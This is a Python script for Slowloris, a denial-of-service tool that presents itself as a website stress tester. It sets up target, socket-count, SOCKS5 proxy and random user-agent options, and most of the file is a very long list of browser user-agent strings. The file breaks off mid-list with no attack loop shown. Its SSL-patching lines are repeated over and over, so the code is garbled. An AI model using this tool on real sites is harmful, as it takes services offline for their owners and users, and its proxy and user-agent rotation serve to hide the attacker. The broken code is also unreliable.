#!/usr/bin/env python3
import argparse
import logging
import random
import socket
import sys
import time

parser = argparse.ArgumentParser(
    description="Slowloris, low bandwidth stress test tool for websites"
)
parser.add_argument("host", nargs="?", help="Host to perform stress test on")
parser.add_argument(
    "-p", "--port", default=80, help="Port of webserver, usually 80", type=int
)
parser.add_argument(
    "-s",
    "--sockets",
    default=1000,
    help="Number of sockets to use in the test",
    type=int,
)
parser.add_argument(
    "-v",
    "--verbose",
    dest="verbose",
    action="store_true",
    help="Increases logging",
)
parser.add_argument(
    "-ua",
    "--randuseragents",
    dest="randuseragent",
    action="store_true",
    help="Randomizes user-agents with each request",
)
parser.add_argument(
    "-x",
    "--useproxy",
    dest="useproxy",
    action="store_true",
    help="Use a SOCKS5 proxy for connecting",
)
parser.add_argument(
    "--proxy-host", default="127.0.0.1", help="SOCKS5 proxy host"
)
parser.add_argument(
    "--proxy-port", default="8080", help="SOCKS5 proxy port", type=int
)
parser.add_argument(
    "--https",
    dest="https",
    action="store_true",
    help="Use HTTPS for the requests",
)
parser.add_argument(
    "--sleeptime",
    dest="sleeptime",
    default=0,
    type=int,
    help="Time to sleep between each header sent.",
)
parser.set_defaults(verbose=False)
parser.set_defaults(randuseragent=False)
parser.set_defaults(useproxy=False)
parser.set_defaults(https=False)
args = parser.parse_args()

if len(sys.argv) <= 1:
    parser.print_help()
    sys.exit(1)

if not args.host:
    print("Host required!")
    parser.print_help()
    sys.exit(1)

if args.useproxy:
    # Tries to import to external "socks" library
    # and monkey patches socket.socket to connect over
    # the proxy by default
    try:
        import socks

        socks.setdefaultproxy(
            socks.PROXY_TYPE_SOCKS5, args.proxy_host, args.proxy_port
        )
        socket.socket = socks.socksocket
        logging.info("Using SOCKS5 proxy for connecting...")
    except ImportError:
        logging.error("Socks Proxy Library Not Available!")

if args.verbose:
    logging.basicConfig(
        format="[%(asctime)s] %(message)s",
        datefmt="%d-%m-%Y %H:%M:%S",
        level=logging.DEBUG,
    )
else:
    logging.basicConfig(
        format="[%(asctime)s] %(message)s",
        datefmt="%d-%m-%Y %H:%M:%S",
        level=logging.INFO,
    )


def send_line(self, line):
    line = f"{line}\r\n"
    self.send(line.encode("utf-8"))


def send_header(self, name, value):
    self.send_line(f"{name}: {value}")


if args.https:
    logging.info("Importing ssl module")
    import ssl

    setattr(ssl.SSLSocket, "send_line", send_line)
    setattr(ssl.SSLSocket, "send_header", send_header)
    setattr(ssl.SSLSocket, "send_line", send_line)
    setattr(ssl.SSLSocket, "send_header", send_header)
    setattr(ssl.SSLSocket, "send_line", send_line)
    setattr(ssl.SSLSocket, "send_header", send_header)
    setattr(ssl.SSLSocket, "send_line", send_line)
    setattr(ssl.SSLSocket, "send_header", send_header)
    setattr(ssl.SSLSocket, "send_line", send_line)
    setattr(ssl.SSLSocket, "send_header", send_header)
    setattr(ssl.SSLSocket, "send_line", send_line)
    setattr(ssl.SSLSocket, "send_header", send_header)
    setattr(ssl.SSLSocket, "send_line", send_line)
    setattr(ssl.SSLSocket, "send_header", send_header)
    setattr(ssl.SSLSocket, "send_line", send_line)
    setattr(ssl.SSLSocket, "send_header", send_header)
    setattr(ssl.SSLSocket, "send_line", send_line)
    setattr(ssl.SSLSocket, "send_header", send_header)
    setattr(ssl.SSLSocket, "send_line", send_line)
    setattr(ssl.SSLSocket, "send_header", send_header)
    setattr(ssl.SSLSocket, "send_line", send_line)
    setattr(ssl.SSLSocket, "send_header", send_header)
    setattr(ssl.SSLSocket, "send_line", send_line)
    setattr(ssl.SSLSocket, "send_header", send_header)
    setattr(ssl.SSLSocket, "send_line", send_line)
    setattr(ssl.SSLSocket, "send_header", send_header)
    setattr(ssl.SSLSocket, "send_line", send_line)
    setattr(ssl.SSLSocket, "send_header", send_header)
    setattr(ssl.SSLSocket, "send_line", send_line)
    setattr(ssl.SSLSocket, "send_header", send_header)


list_of_sockets = []
user_agents = [
    "Mozilla/5.0 (Linux; U; Android 4.0.4; fr-fr; MIDC409 Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",
    "Mozilla/5.0 (Linux; U; Android 4.0.3; fr-fr; MIDC410 Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",
    "Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Linux; U; Android 4.0.3; ru-ru; Explay Surfer 7.02 Build/ICS.g12refM703A1HZ1.20121009) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0",
    "Mozilla/5.0 (Linux; Android 4.2.1; Nexus 7 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19",
    "Mozilla/5.0 (Android; Mobile; rv:18.0) Gecko/18.0 Firefox/18.0",
    "Mozilla/5.0 (Linux; Android 4.2.1; Nexus 4 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19",
    "Mozilla/5.0 (Linux; U; Android 4.0.3; es-es; MIDC410 Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",
    "Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19",
    "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9300 Build/JZO54K) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19",
    "Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19",
    "Mozilla/5.0 (Linux; U; Android 4.0.2; en-us; Galaxy Nexus Build/ICL53F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
    "Mozilla/5.0 (Android; Tablet; rv:18.0) Gecko/18.0 Firefox/18.0",
    "Mozilla/5.0 (Linux; U; Android 4.1.1; en-us; Nexus S Build/JRO03E) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
    "Mozilla/5.0 (Linux; Android 4.2.1; Nexus 10 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19",
    "Mozilla/5.0 (Linux; U; Android 4.1.2; en-gb; GT-I9300 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
    "Mozilla/5.0 (Linux; Android 4.2.1; Galaxy Nexus Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19",
    "Mozilla/5.0 (Linux; U; Android 4.1.2; en-au; GT-N5100 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",
    "MSM7627A/1.0 Android/2.3 gingerbread/2.3.5 Release/11.16.2011 Browser/WebKit533.1 Profile/MIDP-1.0 Configuration/CLDC-1.0",
    "Opera/9.80 (Android 4.0.4; Linux; Opera Mobi/ADR-1301080958) Presto/2.11.355 Version/12.10",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (MSIE 10.0; Windows NT 6.1; Trident/5.0)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; WOW64; Trident/4.0; SLCC1)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/88536.25",
    "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 920)",
    "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0",
    "Mozilla/5.0 (Windows; U; Windows NT 5.0; de-AT; rv:1.3b) Gecko/20030210",
"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.3b) Gecko/20030210",
"Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.3a) Gecko/20021212",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.3a) Gecko/20021212",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; de-AT; rv:1.3a) Gecko/20021212",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.3a) Gecko/20021212",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; de-AT; rv:1.3a) Gecko/20021212",
"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.3a) Gecko/20021212",
"Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.3.1) Gecko/20030509",
"Mozilla/5.0 (X11; U; Linux i686; hu-HU; rv:1.3.1) Gecko",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.3.1) Gecko/20030428",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.3.1) Gecko/20030425",
"Mozilla/5.0 (Windows; U; WinNT4.0; de-AT; rv:1.3.1) Gecko/20030425",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.3.1) Gecko/20030425",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.3.1) Gecko/20030425",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.3.1) Gecko/20030425",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; de-AT; rv:1.3.1) Gecko/20030425",
"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.3.1) Gecko/20030425",
"Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.3) Gecko/20030318",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.3) Gecko/20030523",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.3) Gecko/20030413",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.3) Gecko/20030401",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.3) Gecko/20030327 Debian/1.3-4",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.3) Gecko/20030326",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.3) Gecko/20030320",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.3) Gecko/20030314",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.3) Gecko/20030313",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.3) Gecko/20030312",
"Mozilla/5.0 (X11; U; Linux i686; de-AT; rv:1.3) Gecko/20030430 Debian/1.3-5",
"Mozilla/5.0 (X11; U; Linux i686; de-AT; rv:1.3) Gecko/20030327 Debian/1.3-4",
"Mozilla/5.0 (X11; U; Linux i686; de-AT; rv:1.3) Gecko/20030312",
"Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.3) Gecko/20030312",
"Mozilla/5.0 (X11; U; HP-UX 9000/785; en-US; rv:1.3) Gecko/20030321",
"Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.3) Gecko/20030312",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.3) Gecko/20030312",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; de-AT; rv:1.3) Gecko/20030312",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.3) Gecko/20030312",
"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.3) Gecko/20030312",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.2b) Gecko/20021016",
"Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.2b) Gecko/20021016",
"Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021016",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.2b) Gecko/20021016",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.2b) Gecko/20021016",
"Mozilla/5.0 (Macintosh; U; PPC; en-US; rv:1.2b) Gecko/20021016",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US; rv:1.2b) Gecko/20021016",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.2b) Gecko/20021016",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.2a) Gecko/20020910",
"Mozilla/5.0 (X11; U; Linux i686; de-AT; rv:1.2a) Gecko/20020910",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.2a) Gecko/20020910",
"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.2a) Gecko/20020910",
"Mozilla/5.0 (Macintosh; U; PPC; en-US; rv:1.2a) Gecko/20020910",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.2a) Gecko/20020910",
"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.2a) Gecko/20020910",
"Mozilla/5.0 (Macintosh; U; PPC; en-US; rv:1.2a) Gecko/20020910",
"Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.2.1) Gecko/20030711",
"Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.2.1) Gecko/20021217",
"Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.2.1) Gecko/20021212",
"Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.2.1) Gecko/20021205",
"Mozilla/5.0 (X11; U; Linux i686;en-US; rv:1.2.1) Gecko/20030225",
"Mozilla/5.0 (X11; U; Linux i686; zh-CN; rv:1.2.1) Gecko/20030225",
"Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.2.1) Gecko/20021130",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.2.1) Gecko/20030427",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.2.1) Gecko/20030409 Debian/1.2.1-9woody2",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.2.1) Gecko/20030225",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.2.1) Gecko/20030113",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.2.1) Gecko/20021213 Debian/1.2.1-2.bunk",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.2.1) Gecko/20021208 Debian/1.2.1-2",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.2.1) Gecko/20021204",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.2.1) Gecko/20021203",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.2.1) Gecko/20021130",
"Mozilla/5.0 (X11; U; Linux i686; de-AT; rv:1.2.1) Gecko/20021226 Debian/1.2.1-9",
"Mozilla/5.0 (X11; U; Linux i686; de-AT; rv:1.2.1) Gecko/20021204",
"Mozilla/5.0 (X11; U; Linux i686; de-AT; rv:1.2.1) Gecko/20021130",
"Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.2.1) Gecko/20021204",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.2) Gecko/20021202",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.2) Gecko/20021126",
"Mozilla/5.0 (X11; U; Linux i686; de-AT; rv:1.2) Gecko/20021203",
"Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.2) Gecko/20050223",
"Mozilla/5.0 (X11; U; HP-UX 9000/785; en-US; rv:1.2) Gecko/20021203",
"Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2) Gecko/20021126",
"Mozilla/5.0 (Windows; U; WinNT4.0; de-AT; rv:1.2) Gecko/20021126",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.2) Gecko/20021126",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.2) Gecko/20021126",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; de-AT; rv:1.2) Gecko/20021126",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US; rv:1.2) Gecko/20021126",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.1b) Gecko/20020722",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.1b) Gecko/20020721",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; de-AT; rv:1.1b) Gecko/20020721",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.1a) Gecko/20020610",
"Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.1a) Gecko/20020611",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.1a) Gecko/20020611",
"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.1a) Gecko/20020611",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US; rv:1.1a) Gecko/20020610",
"Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.1a) Gecko/20020611",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.1a) Gecko/20020611",
"Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.1) Gecko/20020925",
"Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.1) Gecko/20020909",
"Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.1) Gecko/20020827",
"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.1) Gecko/20020927",
"Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.1) Gecko/20020826",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.1) Gecko/20020913 Debian/1.1-1",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.1) Gecko/20020829",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.1) Gecko/20020828",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.1) Gecko/20020826",
"Mozilla/5.0 (X11; U; Linux i686; de-AT; rv:1.1) Gecko/20020913 Debian/1.1-1",
"Mozilla/5.0 (X11; U; Linux i686; de-AT; rv:1.1) Gecko/20020826",
"Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.1) Gecko/20020826",
"Mozilla/5.0 (X11; U; Linux i386; en-US; rv:1.1) Gecko/20020826",
"Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.1) Gecko/20021223",
"Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.1) Gecko/20020826",
"Mozilla/5.0 (Windows; U; WinNT4.0; de-AT; rv:1.1) Gecko/20020826",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.1) Gecko/20020826",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; de-AT; rv:1.1) Gecko/20020826",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; fr-FR; rv:1.1) Gecko/20020826",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.1) Gecko/20020826",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0rc3) Gecko/20020529 Debian/1.0rc3-1",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.0rc3) Gecko/20020523",
"Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.0rc3) Gecko/20020523",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0rc2) Gecko/20020510",
"Mozilla/5.0 (X11; U; AIX 005A471A4C00; en-US; rv:1.0rc2) Gecko/20020514",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.0rc2) Gecko/20020510",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; de-AT; rv:1.0rc2) Gecko/20020510",
"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.0rc2) Gecko/20020510",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.0rc2) Gecko/20020510",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; de-AT; rv:1.0rc2) Gecko/20020510",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.0rc1) Gecko/20020417",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.2) Gecko/20030716",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; fr-FR; rv:1.0.2) Gecko/20030208",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.2) Gecko/20021216",
"Mozilla/5.0 (Macintosh; U; PPC; en-US; rv:1.0.2) Gecko/20021216",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021203",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021122 Debian/1.0.1-2",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021110",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20020919",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20020918",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20020912",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20020903",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20020830",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20020826",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020826",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; de-AT; rv:1.0.1) Gecko/20020826",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.0.1) Gecko/20020826",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.0.1) Gecko/20020815",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; de-AT; rv:1.0.1) Gecko/20020826",
"Mozilla/5.0 (Windows; U; Win 9x 4.90; en-US; rv:1.0.1) Gecko/20020826",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20020903",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20020830",
"Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.0.1) Gecko/20020826",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.0.1) Gecko/20020826",
"Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.0.0) Gecko/20020611",
"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.0.0) Gecko/20020622 Debian/1.0.0-0.woody.1",
"Mozilla/5.0 (X11; U; Linux i686; fr-FR; rv:1.0.0) Gecko/20020623 Debian/1.0.0-0.woody.1",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.0) Gecko/20021004",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.0) Gecko/20020623 Debian/1.0.0-0.woody.1",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.0) Gecko/20020612",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.0) Gecko/20020605",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.0) Gecko/20020529",
"Mozilla/5.0 (X11; U; Linux i686; de-AT; rv:1.0.0) Gecko/20020615 Debian/1.0.0-3",
"Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.0.0) Gecko/20020623 Debian/1.0.0-0.woody.1",
"Mozilla/5.0 (X11; U; HP-UX 9000/785; en-US; rv:1.0.0) Gecko/20020605",
"Mozilla/5.0 (Windows; U; WinNT4.0; fr-FR; rv:1.0.0) Gecko/20020530",
"Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.0.0) Gecko/20020530",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; fr-FR; rv:1.0.0) Gecko/20020530",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.0) Gecko/20020530",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.0) Gecko/20020509",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; de-AT; rv:1.0.0) Gecko/20020530",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; fr-FR; rv:1.0.0) Gecko/20020530",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.0.0) Gecko/20020530",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; de-AT; rv:1.0.0) Gecko/20020530",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.9) Gecko/20020513",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.9) Gecko/20020423",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.9) Gecko/20020408",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.9) Gecko/20020313",
"Mozilla/5.0 (X11; U; Linux i586; en-US; rv:0.9.9) Gecko/20020513",
"Mozilla/5.0 (Windows; U; Win98; en-US; rv:0.9.9) Gecko/20020311",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.8) Gecko/20020204",
"Mozilla/5.0 (X11; U; Linux i686; de-AT; rv:0.9.8) Gecko/20020204",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; de-AT; rv:0.9.8) Gecko/20020204",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.8) Gecko/20020204",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:0.9.7) Gecko/20011221",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.6) Gecko/20011202",
"Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:0.9.5) Gecko/20011011",
